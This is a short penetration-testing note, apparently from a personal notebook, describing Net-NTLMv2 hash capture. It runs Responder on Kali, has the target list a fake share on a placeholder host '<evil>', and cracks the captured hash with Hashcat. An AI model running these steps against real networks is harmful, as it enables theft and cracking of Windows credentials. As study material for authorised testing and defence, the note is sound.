---
title: Capturing the Hash
updated: 2025-05-17 10:51:26Z
created: 2025-04-29 04:19:32Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

# Professional Hash Capture Suite

> **Note**: Enhanced with professional capture capabilities. See [Professional Cracking Suite](Professional%20Cracking%20Suite.md) for advanced features.

## Professional Features
- **Enhanced Responder**: Multi-protocol hash capture
- **Real-time Monitoring**: Live hash capture display
- **Automatic Parsing**: Extract hashes from network traffic
- **Multiple Protocols**: SMB, HTTP, LDAP, MSSQL support

## Net-NTLMv2
Used for Authenticating Windows Clients over a network
1. Start **responder** on kali to setup SMB listening
`responder -I <interface>`
2. From target machine, access a fake share
eg `dir \\<evil>\blah`
3. Check **responder** for captured Hash
4. Save hash to **file.hash** and crack with Hashcat (see 06 - CRACKING | Hashcat)